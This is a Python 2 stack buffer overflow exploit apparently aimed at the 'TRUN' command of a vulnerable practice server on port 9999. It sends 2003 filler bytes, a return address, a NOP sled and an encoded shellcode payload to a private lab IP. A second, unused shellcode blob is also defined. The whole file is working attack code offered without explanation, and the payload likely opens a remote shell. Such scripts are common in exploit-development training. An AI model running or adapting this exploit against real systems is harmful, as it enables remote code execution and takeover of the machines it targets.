#!/usr/bin/python
import sys, socket

shellcode =  ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xb9\xdd\x97\x2f\x9b\x3e\x46\xec\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x45\x95\x14\xcb\x6b\xd6"
"\x86\xec\xb9\xdd\xd6\x7e\xda\x6e\x14\xbd\xef\x95\xa6\xfd\xfe"
"\x76\xcd\xbe\xd9\x95\x1c\x7d\x83\x76\xcd\xbe\x99\x95\x1c\x5d"
"\xcb\x76\x49\x5b\xf3\x97\xda\x1e\x52\x76\x77\x2c\x15\xe1\xf6"
"\x53\x99\x12\x66\xad\x78\x14\x9a\x6e\x9a\xff\xa4\x01\xeb\x9c"
"\xc6\x67\x10\x6c\x66\x67\xfb\xe1\xdf\x2e\x4b\xb5\xc6\x64\xb9"
"\xdd\x97\x67\x1e\xfe\x32\x8b\xf1\xdc\x47\x7f\x10\x76\x5e\xa8"
"\x32\x9d\xb7\x66\x9a\xee\xa5\xba\xf1\x22\x5e\x6e\x10\x0a\xce"
"\xa4\xb8\x0b\xda\x1e\x52\x76\x77\x2c\x15\x9c\x56\xe6\x96\x7f"
"\x47\x2d\x81\x3d\xe2\xde\xd7\x3d\x0a\xc8\xb1\x98\xae\xfe\xee"
"\xe6\x1e\xa8\x32\x9d\xb3\x66\x9a\xee\x20\xad\x32\xd1\xdf\x6b"
"\x10\x7e\x5a\xa5\xb8\x0d\xd6\xa4\x9f\xb6\x0e\xed\x69\x9c\xcf"
"\x6e\xc3\x60\x1f\xb6\xf8\x85\xd6\x76\xda\x64\x0e\x6f\x55\xfd"
"\xd6\x7d\x64\xde\x1e\xad\xe0\x87\xdf\xa4\x89\xd7\x11\x13\x46"
"\x22\xca\x66\x25\x49\x35\xde\xe6\xee\xa5\x2f\x9b\x7f\x10\xa5"
"\x30\x3b\xdf\xae\x77\x9e\x47\xec\xb9\x94\x1e\xca\xd2\x82\x44"
"\xec\xa8\x81\x9d\x38\xa1\x08\x07\xb8\xf0\x54\x73\x63\x12\xcf"
"\x07\x56\xf5\xaa\xb1\x28\x64\xeb\x0a\x65\x53\xb5\x96\x2e\x9b"
"\x3e\x1f\xad\x03\xf4\x17\x44\x9b\xc1\x93\xbc\xe9\x90\xa6\xe6"
"\xd6\x0f\x86\xa4\x46\x1d\xdf\xa6\x59\x76\xb9\x2c\xf1\x54\x56"
"\x6e\x21\xd4\x49\x33\x59\x22\x42\x67\x12\xf9\x2c\xfc\xf8\x85"
"\xdb\xa6\x79\x76\xcf\x15\xf8\x67\x0e\x8a\xef\x5f\xb9\x39\xf1"
"\x5c\x53\x6f\x99\x3e\x46\xa5\x01\xbe\xfa\x4b\x9b\x3e\x46\xec"
"\xb9\x9c\xc7\x6e\xcb\x76\xcf\x0e\xee\x8a\xc0\x62\xaa\xfe\x2c"
"\xe1\xe0\x9c\xc7\xcd\x67\x58\x81\xa8\x9d\x89\x96\x2e\xd3\xb3"
"\x02\xc8\xa1\x1b\x97\x47\xd3\xb7\xa0\xba\xe9\x9c\xc7\x6e\xcb"
"\x7f\x16\xa5\x46\x1d\xd6\x7f\xd2\xc1\x8e\xa1\x30\x1c\xdb\xa6"
"\x5a\x7f\xfc\x95\x75\xe2\x11\xd0\x4e\x76\x77\x3e\xf1\x22\x5d"
"\xa4\x95\x7f\xfc\xe4\x3e\xc0\xf7\xd0\x4e\x85\xa6\xf1\x93\xd7"
"\xd6\x95\x3d\xab\xfb\x71\x46\x08\xdf\xac\x5f\x16\x7a\xea\xc5"
"\xd7\x17\xd4\x7b\x4b\x43\x57\xfe\xce\xe5\x40\xf1\x3e\x1f\xad"
"\x30\x07\x68\xfa\x9b\x3e\x46\xec")

buf = "\xdd\xc7\xbb\x68\xd7\xc7\xb9\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x52\x83\xef\xfc\x31\x5f\x13\x03\x37\xc4\x25"
buf += "\x4c\x3b\x02\x2b\xaf\xc3\xd3\x4c\x39\x26\xe2\x4c\x5d"
buf += "\x23\x55\x7d\x15\x61\x5a\xf6\x7b\x91\xe9\x7a\x54\x96"
buf += "\x5a\x30\x82\x99\x5b\x69\xf6\xb8\xdf\x70\x2b\x1a\xe1"
buf += "\xba\x3e\x5b\x26\xa6\xb3\x09\xff\xac\x66\xbd\x74\xf8"
buf += "\xba\x36\xc6\xec\xba\xab\x9f\x0f\xea\x7a\xab\x49\x2c"
buf += "\x7d\x78\xe2\x65\x65\x9d\xcf\x3c\x1e\x55\xbb\xbe\xf6"
buf += "\xa7\x44\x6c\x37\x08\xb7\x6c\x70\xaf\x28\x1b\x88\xd3"
buf += "\xd5\x1c\x4f\xa9\x01\xa8\x4b\x09\xc1\x0a\xb7\xab\x06"
buf += "\xcc\x3c\xa7\xe3\x9a\x1a\xa4\xf2\x4f\x11\xd0\x7f\x6e"
buf += "\xf5\x50\x3b\x55\xd1\x39\x9f\xf4\x40\xe4\x4e\x08\x92"
buf += "\x47\x2e\xac\xd9\x6a\x3b\xdd\x80\xe2\x88\xec\x3a\xf3"
buf += "\x86\x67\x49\xc1\x09\xdc\xc5\x69\xc1\xfa\x12\x8d\xf8"
buf += "\xbb\x8c\x70\x03\xbc\x85\xb6\x57\xec\xbd\x1f\xd8\x67"
buf += "\x3d\x9f\x0d\x27\x6d\x0f\xfe\x88\xdd\xef\xae\x60\x37"
buf += "\xe0\x91\x91\x38\x2a\xba\x38\xc3\xbd\xcf\xab\xf1\x0b"
buf += "\xb8\xd1\x05\x65\x64\x5f\xe3\xef\x84\x09\xbc\x87\x3d"
buf += "\x10\x36\x39\xc1\x8e\x33\x79\x49\x3d\xc4\x34\xba\x48"
buf += "\xd6\xa1\x4a\x07\x84\x64\x54\xbd\xa0\xeb\xc7\x5a\x30"
buf += "\x65\xf4\xf4\x67\x22\xca\x0c\xed\xde\x75\xa7\x13\x23"
buf += "\xe3\x80\x97\xf8\xd0\x0f\x16\x8c\x6d\x34\x08\x48\x6d"
buf += "\x70\x7c\x04\x38\x2e\x2a\xe2\x92\x80\x84\xbc\x49\x4b"
buf += "\x40\x38\xa2\x4c\x16\x45\xef\x3a\xf6\xf4\x46\x7b\x09"
buf += "\x38\x0f\x8b\x72\x24\xaf\x74\xa9\xec\xcf\x96\x7b\x19"
buf += "\x78\x0f\xee\xa0\xe5\xb0\xc5\xe7\x13\x33\xef\x97\xe7"
buf += "\x2b\x9a\x92\xac\xeb\x77\xef\xbd\x99\x77\x5c\xbd\x8b"

     
buffer = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + buf
     
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.23.58.52',9999))
	s.send(('TRUN /.:/' + buffer))
	s.close()
	print "Payload sent without crashing"
except: 
	print "Fuzzing crashed at %s bytes" % str(len(buffer))
	sys.exit()
